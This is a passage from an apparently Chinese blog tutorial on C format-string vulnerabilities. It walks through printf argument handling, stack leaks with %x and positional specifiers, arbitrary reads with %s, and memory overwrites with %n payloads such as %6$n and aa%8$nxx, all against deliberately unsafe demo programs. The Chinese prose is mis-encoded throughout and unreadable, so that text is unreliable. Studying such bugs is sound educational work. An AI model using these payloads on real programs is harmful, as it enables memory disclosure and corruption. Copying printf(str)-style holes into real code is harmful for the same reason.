widthã€‚</li></ul></blockquote><p>â€‹ä¸‹é¢ä½¿ç”¨å‡ ä¸ªæ¡ˆä¾‹æ¥è¯´æ˜ä¸‹å‡ ä¸ªéœ€è¦æ³¨æ„çš„å‚æ•°ï¼š</p><blockquote><p>parameterï¼š</p><pre><code>  n$ è¡¨ç¤ºè·å–åé¢å‚æ•°åˆ—è¡¨ä¸­çš„ç¬¬å‡ ä¸ªå‚æ•°ã€‚</code></pre></blockquote><p>â€‹æ¯”å¦‚å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%2$d\n&quot;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹é€šè¿‡ç¼–è¯‘è¿è¡Œä¹‹åå¾—åˆ°çš„å€¼å´æ˜¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@g01den-virtual-machine:/home/g01den/Temp<span class="comment"># ./a</span></span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>â€‹å¥½äº†ï¼Œæˆ‘ä»¬ç¨å¾®ä¿®æ”¹ä¸‹åˆšåˆšçš„ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d%d%d\n&quot;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ç„¶åç¼–è¯‘ä¸º 32 ä½ä¹‹åï¼ŒæŸ¥çœ‹ä¸‹æ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0000119d &lt;main&gt;:</span><br><span class="line">    119d:       8d 4c 24 04             lea    0x4(%esp),%ecx</span><br><span class="line">    11a1:       83 e4 f0                and    $0xfffffff0,%esp</span><br><span class="line">    11a4:       ff 71 fc                push   -0x4(%ecx)</span><br><span class="line">    11a7:       55                      push   %ebp</span><br><span class="line">    11a8:       89 e5                   mov    %esp,%ebp</span><br><span class="line">    11aa:       53                      push   %ebx</span><br><span class="line">    11ab:       51                      push   %ecx</span><br><span class="line">    11ac:       e8 2b 00 00 00          call   11dc &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">    11b1:       05 27 2e 00 00          add    $0x2e27,%eax</span><br><span class="line">    11b6:       6a 03                   push   $0x3      &lt;-------------------------------</span><br><span class="line">    11b8:       6a 02                   push   $0x2      &lt;-------------------------------</span><br><span class="line">    11ba:       6a 01                   push   $0x1      &lt;-------------------------------</span><br><span class="line">    11bc:       8d 90 30 e0 ff ff       lea    -0x1fd0(%eax),%edx</span><br><span class="line">    11c2:       52                      push   %edx</span><br><span class="line">    11c3:       89 c3                   mov    %eax,%ebx</span><br><span class="line">    11c5:       e8 86 fe ff ff          call   1050 &lt;printf@plt&gt;</span><br><span class="line">    11ca:       83 c4 10                add    $0x10,%esp</span><br><span class="line">    11cd:       b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">    11d2:       8d 65 f8                lea    -0x8(%ebp),%esp</span><br><span class="line">    11d5:       59                      pop    %ecx</span><br><span class="line">    11d6:       5b                      pop    %ebx</span><br><span class="line">    11d7:       5d                      pop    %ebp</span><br><span class="line">    11d8:       8d 61 fc                lea    -0x4(%ecx),%esp</span><br><span class="line">    11db:       c3                      ret</span><br></pre></td></tr></table></figure><p>â€‹èƒ½å¤Ÿå‘ç°åœ¨æˆ‘æŒ‡çš„é‚£ä¸‰è¡Œï¼Œåœ¨è°ƒç”¨ printf å‡½æ•°ä¹‹å‰æ˜¯å…ˆå°†å‚æ•°ä»å³å‘å·¦å‹å…¥æ ˆä¸­ï¼Œä¹‹åé€šè¿‡è¯»å–æ ˆçš„å‚æ•°ä¸æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸€èµ·æ‰“å°å‡ºæ¥ã€‚</p><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a class="markdownIt-Anchor" href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´">#</a> æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š</h2><p>â€‹æœ‰äº†å‰é¢çš„é‚£äº›å‚¨å¤‡çŸ¥è¯†ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥æ¥çœ‹çœ‹æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ¼æ´äº†ã€‚</p><h3 id="åˆæ¢"><a class="markdownIt-Anchor" href="#åˆæ¢">#</a> åˆæ¢ï¼š</h3><p>â€‹é¦–å…ˆï¼Œå†™ä¸€ä¸ªç¨‹åºï¼Œå¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x  %x  %x  %x  \n&quot;</span>,<span class="number">0x1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹é‚£ä¹ˆï¼Œç›´æ¥è¿›è¡ŒåŠ¨æ€è°ƒè¯•ï¼Œè§‚çœ‹<strong> main</strong> çš„æ ˆå¸§ä¸­ç›¸å…³çš„ä¿¡æ¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00:0000â”‚ esp 0xffffd500 â€”â–¸ 0x56557008 â—‚â€” &#x27;%x  %x  %x  %x  \n&#x27;</span><br><span class="line">01:0004â”‚-014 0xffffd504 â—‚â€” 0x1                                            &lt;--------------------</span><br><span class="line">02:0008â”‚-010 0xffffd508 â€”â–¸ 0xf7fbeb20 â€”â–¸ 0xf7c1acc6 â—‚â€” &#x27;GLIBC_PRIVATE&#x27;    &lt;--------------------</span><br><span class="line">03:000câ”‚-00c 0xffffd50c â€”â–¸ 0x565561b1 (main+20) â—‚â€” add eax, 0x2e27        &lt;--------------------</span><br><span class="line">04:0010â”‚-008 0xffffd510 â€”â–¸ 0xffffd530 â—‚â€” 0x1          &lt;--------------------</span><br><span class="line">05:0014â”‚-004 0xffffd514 â€”â–¸ 0xf7e2a000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x229dac</span><br><span class="line">06:0018â”‚ ebp 0xffffd518 â€”â–¸ 0xf7ffd020 (_rtld_global) â€”â–¸ 0xf7ffda40 â€”â–¸ 0x56555000 â—‚â€” 0x464c457f</span><br></pre></td></tr></table></figure><p>â€‹ç„¶åï¼Œè¿è¡Œåˆ° printf å‡½æ•°ä¹‹åï¼Œå†çœ‹çœ‹è¾“å‡ºçš„å€¼æ˜¯å¤šå°‘ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">n</span></span><br><span class="line">1  f7fbeb20  565561b1  ffffd530</span><br></pre></td></tr></table></figure><p>â€‹å‘ç°è¾“å‡ºçš„å€¼å’Œç®­å¤´æŒ‡å‡ºæ¥çš„å€¼ä¸€æ ·ã€‚å› æ­¤ï¼Œé»‘å®¢åˆ™å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´é…åˆ **% n$d** æ¥è¿›è¡Œå†…å­˜çš„è¯»å–äº†ã€‚</p><p>â€‹</p><h3 id="ä¸€æ¬¡ç®€å•çš„æ¼æ´çš„å®ä¾‹"><a class="markdownIt-Anchor" href="#ä¸€æ¬¡ç®€å•çš„æ¼æ´çš„å®ä¾‹">#</a> ä¸€æ¬¡ç®€å•çš„æ¼æ´çš„å®ä¾‹ï¼š</h3><p>â€‹å®é™…ä¸Šï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ¼æ´å¾ˆå¤šæ—¶å€™éƒ½æ˜¯ç”±äºç¨‹åºå‘˜ä»¬å·æ‡’ï¼Œæ‰ä¼šå¯¼è‡´ä¸€äº›æ¼æ´çš„äº§ç”Ÿï¼Œæ¯”å¦‚ä¸‹é¢çš„ç¨‹åºï¼Œå¦‚æœå†™æˆè¿™ä¸ªæ ·å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s\n&quot;</span>,str);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,str);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¦‚æœæ˜¯è¿™æ ·çš„è¯ï¼Œç¨‹åºè¿è¡Œå°±ä¸ä¼šå‡ºç°å¤ªå¤§çš„é—®é¢˜ï¼Œä½†æ˜¯ï¼Œå½“ç¨‹åºå‘˜å·æ‡’ï¼Œä½¿ç”¨ä¸‹é¢çš„å†™æ³•ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">        <span class="built_in">printf</span>(str);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿è¡Œçš„è¯å°±ä¼šå‡ºç°å¦‚ä¸‹çš„ç»“æœï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@g01den-virtual-machine:/home/g01den/Temp# ./a</span><br><span class="line">aaa.%x</span><br><span class="line">aaa.fff53a28</span><br></pre></td></tr></table></figure><p>â€‹æ ¹æ® gdb è°ƒè¯•ï¼Œå°±ä¼šå‘ç°ï¼Œå®ƒè¾“å‡ºäº†æ¯” esp åœ°å€é«˜ 4 å­—èŠ‚çš„é‚£ä¸€åœ°å€çš„æ•°æ®ã€‚</p><h3 id="æ³„éœ²å†…å­˜"><a class="markdownIt-Anchor" href="#æ³„éœ²å†…å­˜">#</a> æ³„éœ²å†…å­˜ï¼š</h3><p>â€‹è¿˜æ˜¯åˆšæ‰é‚£ä¸ªç¨‹åºï¼Œå…¶å®å¯ä»¥åœ¨è¿™ä¸ªæ—¶å€™å¤šè¾“å…¥å‡ ä¸ª % x æ¥è¿›è¡Œçˆ¶å‡½æ•°æ ˆå¸§çš„ esp é«˜ 4 å­—èŠ‚çš„åœ°å€å¼€å§‹çš„å¤šä¸ªå­—èŠ‚çš„å†…å­˜ï¼Œæˆ–è€…é€šè¿‡ n$ æ¥è¿›è¡Œä»»æ„å†…å­˜çš„è¯»å–ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">aaa.fff53a28root@g01den-virtual-machine:/home/g01den/Temp# ./a</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">x.%x.%x.%x.%x.%x.%x</span></span><br><span class="line">ff8631d8.0.565a31d4.0.0.252e7825.78252e78</span><br><span class="line"></span><br><span class="line">root@g01den-virtual-machine:/home/g01den/Temp# ./a</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">3<span class="variable">$x</span></span></span><br><span class="line">565cf1d4</span><br></pre></td></tr></table></figure><h3 id="æ³„éœ²ä»»æ„åœ°å€çš„å†…å­˜"><a class="markdownIt-Anchor" href="#æ³„éœ²ä»»æ„åœ°å€çš„å†…å­˜">#</a> æ³„éœ²ä»»æ„åœ°å€çš„å†…å­˜ï¼š</h3><p>â€‹ä¸Šä¸€ä¸ªæ–¹æ³•åªæ˜¯æ³„éœ²äº†æ ˆä¸Šçš„æ•°æ®ï¼Œå…¶å®ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å¯ä»¥å¯¹ä»»æ„å†…å­˜åœ°å€çš„æ•°æ®è¿›è¡Œæ³„éœ²ã€‚ã€</p><p>â€‹æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ç±»ä¼¼äº &quot;% s&quot; çš„æ ¼å¼è§„èŒƒåšåˆ°æ³„éœ²æ ˆä¸­å­˜æ”¾çš„å€¼å¯¹åº”çš„åœ°å€çš„å­—ç¬¦ä¸²çš„å†…å®¹ï¼Œè¿™é‡Œå¼•ç”¨ä¸‹ dalao çš„å¯¹äº % s çš„è®²è§£ï¼š</p><blockquote><p><strong>ç¨‹åºä¼šå°† % s æŒ‡å‘çš„åœ°å€ä½œä¸ºä¸€ä¸ª ASCII å­—ç¬¦ä¸²å¤„ç†ï¼Œç›´åˆ°é‡åˆ°ä¸€ä¸ªç©ºå­—ç¬¦ã€‚æ‰€ä»¥ï¼Œå¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ“çºµè¿™ä¸ªå‚æ•°çš„å€¼ï¼Œé‚£å°±å¯ä»¥æ³„éœ²ä»»æ„åœ°å€çš„å†…å®¹ã€‚</strong></p><p>æˆ–è€…è¯´</p><p><strong>% s æ˜¯æŠŠåœ°å€æŒ‡å‘çš„å†…å­˜å†…å®¹ç»™æ‰“å°å‡ºæ¥ï¼Œå¯ä»¥æŠŠ å‡½æ•°çš„åœ°å€ç»™æ‰“å°å‡ºæ¥ã€‚</strong></p></blockquote><p>â€‹ä¹Ÿå°±æ˜¯è¯´ï¼Œæƒ³è¦åšåˆ°ä»»æ„åœ°å€çš„å†…å­˜æ³„éœ²ï¼Œå°±éœ€è¦æƒ³åŠæ³•å¯¹æ ˆä¸Šçš„æŸä¸ªåœ°å€çš„å€¼è¿›è¡Œä¿®æ”¹ä¸ºæƒ³è¦è·å¾—çš„é‚£ä¸ªå­—ç¬¦ä¸²çš„åœ°å€ã€‚</p><h3 id="è¦†ç›–æ ˆå†…å­˜"><a class="markdownIt-Anchor" href="#è¦†ç›–æ ˆå†…å­˜">#</a> è¦†ç›–æ ˆå†…å­˜ï¼š</h3><p>â€‹% n ä¸èƒ½å¤Ÿè¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯ï¼Œå®ƒèƒ½æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥<strong>å¯¹åº”çš„æ•´å½¢æŒ‡é’ˆå‚æ•°æ‰€è‡´çš„å˜é‡</strong>ï¼Œåªè¦å˜é‡å¯¹åº”çš„åœ°å€å¯å†™ï¼Œå°±å¯ä»¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥æ”¹å˜å…¶å¯¹åº”çš„å€¼ã€‚</p><blockquote><p>ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ç§æ–¹æ³•åˆ©ç”¨çš„æ­¥éª¤ä¸ºï¼š</p><ul><li>ç¡®å®šè¦†ç›–åœ°å€</li><li>ç¡®å®šç›¸å¯¹ä½ç§»</li><li>è¿›è¡Œè¦†ç›–</li></ul></blockquote><p>â€‹<strong>æ³¨ï¼šä»¥ä¸‹ä¸ºæˆ‘ä¸ªäººçš„è§è§£ï¼Œå¦‚æœ‰é—®é¢˜ï¼Œè¯·æŒ‡æ­£ã€‚</strong></p><p>â€‹é¦–å…ˆï¼Œä¹‹å‰è¯´è¿‡äº† % n è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä½œç”¨æ˜¯å•¥ï¼š</p><blockquote><p><strong>% n, ä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚</strong></p></blockquote><p>â€‹ä¹‹åï¼Œç”¨ä¸€ä¸ªç¨‹åºä½œä¸ºç¤ºä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified c.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified a for a small number.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified b for a big number!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªç¨‹åºçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„å‡½æ•°å¾ˆå®¹æ˜“å°±èƒ½æ‰¾åˆ°ï¼Œé‚£å°±æ˜¯ printf (s)ï¼Œå› æ­¤ï¼Œå‡è®¾å¯¹å˜é‡ c è¿›è¡Œä¿®æ”¹ï¼Œå°±éœ€è¦ç”¨åˆ° % n å¯¹ C è¿›è¡Œä¿®æ”¹ï¼Œæ‰€ä»¥ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š</p><blockquote><p>c çš„åœ°å€ + 12 ä¸ªä»»æ„çš„å­—ç¬¦ + å¯¹åº”æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‚æ•°çš„åç§»</p></blockquote><p>â€‹å¥½äº†ï¼Œå®é™…è¯•è¯•çœ‹å§ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AAAA,<span class="variable">$p</span>,<span class="variable">$p</span>,<span class="variable">$p</span>,<span class="variable">$p</span>,<span class="variable">$p</span>,<span class="variable">$p</span>,<span class="variable">$p</span>,<span class="variable">$p</span>,<span class="variable">$proot</span>@g01den-virtual-machine:/home/g01den/Temp<span class="comment"># ./a</span></span><br><span class="line">0xff8d3ad4</span><br><span class="line">AAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p</span><br><span class="line">AAA,0xff8d3ad8,(nil),0x565d51e4,(nil),0x315,0x2c414141,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70</span><br></pre></td></tr></table></figure><p>â€‹ç”±æ­¤å¯çŸ¥ï¼Œä¼ å…¥çš„æ ¼å¼åŒ–å­—ç¬¦ä¸² AAAï¼Œæ‰€å¯¹åº”çš„å‚æ•°æ˜¯ç¬¬å…­ä½ï¼Œå› æ­¤ï¼Œå¯¹åº”æ ¼å¼åŒ–å­—ç¬¦ä¸²å¯¹åº”çš„åç§»ä¸º 6ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå€¼ä¸º %6$nï¼Œå¥½çš„ï¼Œä¹‹åå°±æ˜¯ c çš„åœ°å€ï¼Œ<strong>æˆ‘åœ¨å­¦åˆ°è¿™é‡Œçš„æ—¶å€™å‡ºç°äº†ç†è§£ä¸èƒ½çš„é—®é¢˜ï¼Œæœ€åå¤§è‡´æ˜¯æ•´æ˜ç™½äº†ï¼Œå°±æ˜¯ä¸çŸ¥é“å¯¹ä¸å¯¹ã€‚</strong></p><p>â€‹å¯¹äº C çš„åœ°å€ï¼Œæˆ‘è®¤ä¸ºæ˜¯ï¼Œæ­£æ˜¯å› ä¸ºæ„é€ çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‰å››ä¸ªå­—èŠ‚æ˜¯ c çš„åœ°å€ï¼Œå› æ­¤ï¼Œ% n è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨å†™çš„æ—¶å€™å¯¹åº”çš„å°±æ˜¯ç¬¬å…­ä¸ªå‚æ•°ï¼Œè€Œç¬¬å…­ä¸ªå‚æ•°çš„å‰å››ä¸ªå­—èŠ‚å°±æ˜¯ c çš„åœ°å€ï¼Œå› æ­¤å°±æˆåŠŸä¿®æ”¹äº† c è¿™ä¸ªå˜é‡çš„å€¼ï¼›** é‚£ä¹ˆé—®é¢˜å°±æ¥äº†ï¼Œä¸ºå•¥ä¸èƒ½ç›´æ¥æŒ‡å®šç¬¬äº”ä¸ªå‚æ•°è¿›è¡Œä¿®æ”¹å‘¢ï¼Ÿ** æˆ‘ä¸ªäººçš„ç†è§£æ˜¯è¿™æ ·çš„ï¼š<strong>å› ä¸ºç¬¬äº”ä¸ªå‚æ•°å­˜æ”¾çš„å¹¶ä¸æ˜¯ c è¿™ä¸ªå˜é‡çš„åœ°å€ï¼Œæ˜¯ 789ï¼Œå› æ­¤ï¼Œ% n å°±è¯•å›¾æŠŠ 16 å†™å…¥ 789 è¿™ä¸ªåœ°å€é‡Œå»ï¼Œä½†æ˜¯ï¼Œè¿™ä¸ªåœ°å€è¦ä¹ˆä¸å­˜åœ¨ï¼Œè¦ä¹ˆå°±æ˜¯æ— æ³•è®¿é—®ï¼Œåˆ™ä¼šå‡ºç° segment faultï¼Œå¯¼è‡´ç¨‹åºå‡ºç°äº†é”™è¯¯ã€‚</strong></p><h3 id="è¦†ç›–å°æ•°å­—"><a class="markdownIt-Anchor" href="#è¦†ç›–å°æ•°å­—">#</a> è¦†ç›–å°æ•°å­—ï¼š</h3><p>â€‹é‚£ä¹ˆï¼Œé—®é¢˜åˆå‡ºç°äº†ï¼Œå› ä¸ºå¦‚æœè®©å˜é‡çš„åœ°å€ä½œä¸ºå¼€å§‹çš„å­—ç¬¦ï¼Œå°±ä¼šå¯¼è‡´ % n å†™å…¥çš„æœ€å°çš„å€¼ä¹Ÿæ˜¯ 4ï¼Œé‚£ä¹ˆï¼Œå¦‚æœè¦è®©æŸä¸ªå˜é‡è¢«è¦†ç›–ä¸º 2ï¼Œåˆè¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ</p><p>â€‹<strong>æ³¨ï¼šä»¥ä¸‹å¯¹äºå†…å®¹çš„è§£é‡Šéƒ¨åˆ†å‡ä¸ºæˆ‘è‡ªå·±çš„ç†è§£ï¼Œå¦‚æœ‰é”™è¯¯ï¼Œè¿˜è¯·æŒ‡æ­£ã€‚</strong></p><p>â€‹ç…§ç†æ¥è¯´ï¼Œæƒ³è¦æŸä¸ªå˜é‡è¢«è¦†ç›–ä¸º 2 çš„è¯ï¼Œå°±éœ€è¦è¯¸å¦‚</p><blockquote><p>aa% k$naa + åœ°å€</p></blockquote><p>â€‹è¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æ˜¯ä¸ºå•¥å‘¢ï¼Ÿ</p><p>â€‹è¿™é‡Œå€Ÿç”¨ julao ä»¬çš„è¯´æ³•æ˜¯</p><blockquote><p><strong>aa%k<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>x</mi><mi>x</mi><mtext>ï¼Œå¦‚æœç”¨è¿™æ ·çš„æ–¹å¼ï¼Œå‰é¢</mtext><mi>a</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">nxxï¼Œå¦‚æœç”¨è¿™æ ·çš„æ–¹å¼ï¼Œå‰é¢ aa%k æ˜¯ç¬¬å…­ä¸ªå‚æ•°ï¼Œ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">å¦‚</span><span class="mord cjk_fallback">æœ</span><span class="mord cjk_fallback">ç”¨</span><span class="mord cjk_fallback">è¿™</span><span class="mord cjk_fallback">æ ·</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">æ–¹</span><span class="mord cjk_fallback">å¼</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">å‰</span><span class="mord cjk_fallback">é¢</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span></span></span></span>nxx æ˜¯ç¬¬ä¸ƒä¸ªå‚æ•°ï¼Œåé¢åœ¨è·Ÿä¸€ä¸ª æˆ‘ä»¬æƒ³è¦ä¿®æ”¹çš„åœ°å€ï¼Œé‚£ä¹ˆè¿™ä¸ªåœ°å€å°±æ˜¯ç¬¬å…«ä¸ªå‚æ•°ï¼Œåªéœ€è¦æŠŠ k æ”¹æˆ 8 å°±å¯ä»¥æŠŠè¿™ç¬¬å…«ä¸ªå‚æ•°æ”¹æˆ 2ï¼Œaa%8$nxx</strong></p></blockquote><p>â€‹æˆ‘ä¸ªäººçš„ç†è§£ä¸ºï¼Œåœ¨æ ˆä¸­ï¼Œæ¯ä¸ªå­—ç¬¦çš„é•¿åº¦ä¸º 1 å­—èŠ‚ï¼Œå¦å¤–ï¼Œå¯¹äºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‚æ•°ä¼ é€’è€Œè¨€ï¼Œæ¯ä¸ªå‚æ•°éƒ½å ç”¨äº†å››ä¸ªå­—èŠ‚ï¼ˆ32 ä½ï¼‰ï¼Œæ‰€ä»¥ï¼Œè¿™é‡Œéœ€è¦å‰å’Œä¸­éƒ½æ„æˆå››ä¸ªå­—èŠ‚çš„å­—ç¬¦ä¸²ï¼Œå› æ­¤ï¼Œç¬¬å…­ä½çš„å­—ç¬¦ä¸²å°±æ˜¯ aa% kï¼Œç¬¬ä¸ƒä½å°±æ˜¯ $naaï¼Œç¬¬å…«ä½å°±å¯ä»¥ä¼ 